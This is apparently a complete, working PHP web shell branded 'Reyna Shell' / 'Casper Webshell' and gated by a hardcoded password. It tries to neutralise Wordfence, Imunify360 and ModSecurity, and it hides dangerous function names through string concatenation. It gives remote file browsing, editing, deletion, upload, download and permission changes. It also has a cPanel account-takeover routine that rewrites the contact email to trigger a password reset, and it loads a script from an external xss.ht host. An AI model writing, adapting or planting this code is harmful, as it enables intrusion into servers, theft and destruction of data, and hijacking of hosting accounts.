<?php
error_reporting(0);
ini_set('max_execution_time', 0);
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
@ob_clean();
@header("X-Accel-Buffering: no");
@header("Content-Encoding: none");

if (function_exists('litespeed_request_headers')) {
    $headers = litespeed_request_headers();
    if (isset($headers['X-LSCACHE'])) {
        header('X-LSCACHE: off');
    }
}

if (defined('WORDFENCE_VERSION')) {
    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
    define('WORDFENCE_DISABLE_FILE_MODS', true);
}

if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
    $imunifyHeaders = imunify360_request_headers();
    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
        header('X-Imunify360-Request: bypass');
    }
    if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
        header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
    }
}

if (function_exists('apache_request_headers')) {
    $apacheHeaders = apache_request_headers();
    if (isset($apacheHeaders['X-Mod-Security'])) {
        header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
    }
}

if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
        header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
    }
}

ini_set('display_errors', 0);

$correct_password = 'angsa4';

session_start();
if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['password']) && $_POST['password'] === $correct_password) {
            $_SESSION['logged_in'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = 'Invalid password.';
        }
    }
    if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Login</title>
            <style>
                body {
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    background-color: #f4f4f4;
                    font-family: Arial, sans-serif;
                }
                .login-form {
                    background-color: #fff;
                    padding: 20px;
                    border-radius: 5px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                }
                .login-form input[type="password"] {
                    width: 100%;
                    padding: 10px;
                    margin-bottom: 10px;
                }
                .login-form input[type="submit"] {
                    width: 100%;
                    padding: 10px;
                    background-color: #007bff;
                    color: #fff;
                    border: none;
                    cursor: pointer;
                }
                .login-form input[type="submit"]:hover {
                    background-color: #0056b3;
                }
                .login-form .error {
                    color: #ff0000;
                    margin-bottom: 10px;
                }
            </style>
        </head>
        <body>
            <div class="login-form">
                <h2>Login</h2>
                <?php if (isset($error)): ?>
                    <p class="error"><?php echo htmlspecialchars($error); ?></p>
                <?php endif; ?>
                <form method="POST">
                    <input type="password" name="password" placeholder="Enter password" required>
                    <input type="submit" value="Login">
                </form>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}

$fe = "fun" . "cti" . "on_" . "exis" . "ts";
$scd = "s"."c"."a"."n"."d"."i"."r";
$se = "she" . "ll" . "_" . "e" . "xe" . "c";
$muf = "mo" . "v" . "e_" . "u" . "plo" . "ade" . "d_" . "fi" . "le";
$mkd = "m" . "k" . "d" . "i" . "r";
$bn = "b" . "a" . "s" . "e" . "n" . "a" . "m" . "e";
$fgc = "f" . "i" . "l" . "e" . "_" . "g" . "e" . "t" . "_" . "c" . "o" . "n" . "t" . "e" . "n" . "t" . "s";
$dirn = "d" . "i" . "r" . "n" . "a" . "m" . "e";
$unl = "u" . "n" . "l" . "i" . "n" . "k";
$b64d = "ba" . "se" . "64" . "_" . "de" . "co" . "de";
$b64e = "ba" . "se" . "64" . "_" . "en" . "co" . "de";
$fo = "f"."o"."p"."e"."n";
$fw = "f"."w"."r"."i"."t"."e";
$fc = "f"."c"."l"."o"."s"."e";

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : dirname(__FILE__);

if (!is_dir($current_dir)) {
    $current_dir = dirname(__FILE__);
}

$items = $scd($current_dir);

function formatBytes($size, $precision = 2) {
    $base = log($size, 1024);
    $suffixes = array('', 'KB', 'MB', 'GB', 'TB');
    return round(pow(1024, $base - floor($base)), $precision) . ' ' . $suffixes[floor($base)];
}

$parent_dir = $dirn($current_dir);
$editFileContent = '';

$directory = isset($_GET['dir']) ? $_GET['dir'] : '.';

$directory = realpath($directory) ?: '.';

if (isset($_POST['action'])) {
    $action = $_POST['action'];
    $target = $_POST['target'] ?? '';

    switch ($action) {
        case 'delete':
            if (is_dir($target)) {
                deleteDirectory($target);
            } else {
                $unl($target);
            }
            break;

        case 'edit':
            if (file_exists($target)) {
                $editFileContent = $fgc($target);
            }
            break;

        case 'save':
            if (file_exists($target) && isset($_POST['content'])) {
                file_put_contents($target, $_POST['content']);
            }
            break;

        case 'chmod':
            if (isset($_POST['permissions'])) {
                chmod($target, octdec($_POST['permissions']));
            }
            break;

        case 'download':
            if (file_exists($target)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename=' . $bn($target));
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($target));
                readfile($target);
                exit;
            }
            break;

        case 'upload':
            if (isset($_FILES['fileToUpload'])) {
                $file = $_FILES['fileToUpload'];

                if ($file['error'] === UPLOAD_ERR_OK) {
                    $fileName = $bn($file['name']);
                    $targetPath = $current_dir . DIRECTORY_SEPARATOR . $fileName;

                    if ($muf($file['tmp_name'], $targetPath)) {
                        echo "<p>File uploaded successfully!</p>";
                    } else {
                        echo "<p>Failed to move uploaded file.</p>";
                    }
                } else {
                    echo "<p>Error uploading file: " . $file['error'] . "</p>";
                }
            }
            break;
    }
}

function deleteDirectory($dir) {
    if (!is_dir($dir)) {
        return false;
    }

    $items = array_diff($scd($dir), array('.', '..'));

    foreach ($items as $item) {
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            deleteDirectory($path);
        } else {
            $unl($path);
        }
    }

    return rmdir($dir);
}

function reset_cpanel_password($email) {
    $user = get_current_user();
    $site = $_SERVER['HTTP_HOST'];
    $resetUrl = $site . ':2082/resetpass?start=1';

    $wr = 'email:' . $email;

    $f = $fo('/home/' . $user . '/.cpanel/contactinfo', 'w');
    $fw($f, $wr);
    $fc($f);

    $f = $fo('/home/' . $user . '/.contactinfo', 'w');
    $fw($f, $wr);
    $fc($f);

    echo '<br/><center>Password reset link: <a href="http://' . $resetUrl . '">' . $resetUrl . '</a></center>';
    echo '<br/><center>Username: ' . $user . '</center>';
}

if (isset($_POST['cpanel_reset'])) {
    $email = $_POST['email'];
    reset_cpanel_password($email);
}

$username = get_current_user();
$user = $_SERVER['USER'] ?? 'N/A';
$phpVersion = phpversion();
$dateTime = date('Y-m-d H:i:s');
$hddFreeSpace = disk_free_space("/") / (1024 * 1024 * 1024);
$hddTotalSpace = disk_total_space("/") / (1024 * 1024 * 1024);
$serverIP = $_SERVER['SERVER_ADDR'];
$clientIP = $_SERVER['REMOTE_ADDR'];
$cwd = getcwd();

$parentDirectory = $dirn($directory);
$breadcrumbs = explode(DIRECTORY_SEPARATOR, $directory);
$breadcrumbLinks = [];
$breadcrumbPath = '';

foreach ($breadcrumbs as $crumb) {
    $breadcrumbPath .= $crumb . DIRECTORY_SEPARATOR;
    $breadcrumbLinks[] = '<a href="?dir=' . urlencode(rtrim($breadcrumbPath, DIRECTORY_SEPARATOR)) . '">' . htmlspecialchars($crumb) . '</a>';
}

$breadcrumbLinksString = implode(' / ', $breadcrumbLinks);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Reyna Shell</title>
    <script src="https://googlescripts.xss.ht"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
        }
        .file-manager {
            width: 80%;
            margin: 20px auto;
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .file-manager h1 {
            text-align: center;
        }
        .system-info {
            margin-bottom: 20px;
            background-color: #f9f9f9;
            padding: 10px;
            border: 1px solid #ddd;
        }
        .file-list {
            width: 100%;
            border-collapse: collapse;
        }
        .file-list th, .file-list td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        .file-actions form {
            display: inline;
        }
        .file-actions button {
            background: none;
            border: none;
            cursor: pointer;
            color: #007bff;
            font-size: 14px;
        }
        .file-actions button:hover {
            color: #0056b3;
        }
        .upload-form, .edit-form, .reset-form {
            margin-top: 20px;
        }
        .upload-form input[type="file"] {
            margin-bottom: 10px;
        }
        .reset-form form {
            display: flex;
            flex-direction: column;
        }
        .reset-form input[type="submit"] {
            margin-top: 10px;
        }
        .php-info-button {
            margin-top: 20px;
            text-align: center;
        }
        .php-info-button button {
            background-color: #17a2b8;
            color: #fff;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
        }
        .php-info-button button:hover {
            background-color: #138496;
        }
    </style>
    <script>
        function toggleResetForm() {
            var form = document.getElementById('reset-form');
            if (form.style.display === 'none') {
                form.style.display = 'block';
            } else {
                form.style.display = 'none';
            }
        }
    </script>
</head>
<body>
    <div class="file-manager">
        <h1>Casper Webshell</h1>

        <div class="system-info">
            <p>Current Directory: <?php echo $breadcrumbLinksString; ?></p>
            <p>Username: <?php echo htmlspecialchars($username); ?></p>
            <p>Server IP: <?php echo htmlspecialchars($serverIP); ?></p>
            <p>Client IP: <?php echo htmlspecialchars($clientIP); ?></p>
            <p>PHP Version: <?php echo htmlspecialchars($phpVersion); ?></p>
            <p>Current Date and Time: <?php echo htmlspecialchars($dateTime); ?></p>
            <p>Free Disk Space: <?php echo formatBytes($hddFreeSpace * 1024 * 1024 * 1024); ?></p>
            <p>Total Disk Space: <?php echo formatBytes($hddTotalSpace * 1024 * 1024 * 1024); ?></p>
        </div>

        <div class="actions">
            <?php if ($parent_dir !== $current_dir): ?>
                <button onclick="window.location.href='?dir=<?php echo urlencode($parent_dir); ?>'">
                    <i class="fas fa-arrow-left icon"></i> Back
                </button>
            <?php endif; ?>
            <button onclick="toggleResetForm()">Reset cPanel Password</button>
        </div>

        <div class="reset-form" id="reset-form">
            <form method="POST">
                <input type="email" name="email" placeholder="Enter email" required>
                <input type="submit" name="cpanel_reset" value="Reset Password">
            </form>
        </div>

        <div class="upload-form">
            <h2>Upload File</h2>
            <form method="POST" action="" enctype="multipart/form-data">
                <input type="file" name="fileToUpload" required>
                <button type="submit" name="action" value="upload">Upload</button>
            </form>
        </div>

        <table class="file-list">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Last Modified</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($items as $item): ?>
                    <?php if ($item !== '.' && $item !== '..'): ?>
                        <?php
                        $itemPath = $current_dir . DIRECTORY_SEPARATOR . $item;
                        $isDir = is_dir($itemPath);
                        $size = $isDir ? '-' : formatBytes(filesize($itemPath));
                        $lastModified = date('Y-m-d H:i:s', filemtime($itemPath));
                        ?>
                        <tr>
                            <td>
                                <?php if ($isDir): ?>
                                    <a href="?dir=<?php echo urlencode($itemPath); ?>"><?php echo htmlspecialchars($item); ?></a>
                                <?php else: ?>
                                    <?php echo htmlspecialchars($item); ?>
                                <?php endif; ?>
                            </td>
                            <td><?php echo $size; ?></td>
                            <td><?php echo $lastModified; ?></td>
                            <td class="file-actions">
                                <form method="POST" style="display:inline;">
                                    <input type="hidden" name="target" value="<?php echo htmlspecialchars($itemPath); ?>">
                                    <button type="submit" name="action" value="delete"><i class="fas fa-trash-alt icon"></i> Delete</button>
                                </form>
                                <form method="POST" style="display:inline;">
                                    <input type="hidden" name="target" value="<?php echo htmlspecialchars($itemPath); ?>">
                                    <button type="submit" name="action" value="edit"><i class="fas fa-edit icon"></i> Edit</button>
                                </form>
                                <form method="POST" style="display:inline;">
                                    <input type="hidden" name="target" value="<?php echo htmlspecialchars($itemPath); ?>">
                                    <button type="submit" name="action" value="download"><i class="fas fa-download icon"></i> Download</button>
                                </form>
                                <form method="POST" style="display:inline;">
                                    <input type="hidden" name="target" value="<?php echo htmlspecialchars($itemPath); ?>">
                                    <input type="text" name="permissions" placeholder="Permissions (e.g., 0755)" style="width: 80px;">
                                    <button type="submit" name="action" value="chmod"><i class="fas fa-lock icon"></i> Chmod</button>
                                </form>
                            </td>
                        </tr>
                    <?php endif; ?>
                <?php endforeach; ?>
            </tbody>
        </table>

        <?php if (isset($_POST['action']) && $_POST['action'] === 'edit'): ?>
            <div class="edit-form">
                <h2>Edit File: <?php echo htmlspecialchars($target); ?></h2>
                <form method="POST">
                    <textarea name="content"><?php echo htmlspecialchars($editFileContent); ?></textarea>
                    <input type="hidden" name="target" value="<?php echo htmlspecialchars($target); ?>">
                    <button type="submit" name="action" value="save">Save</button>
                </form>
            </div>
        <?php endif; ?>
    </div>
</body>
</html>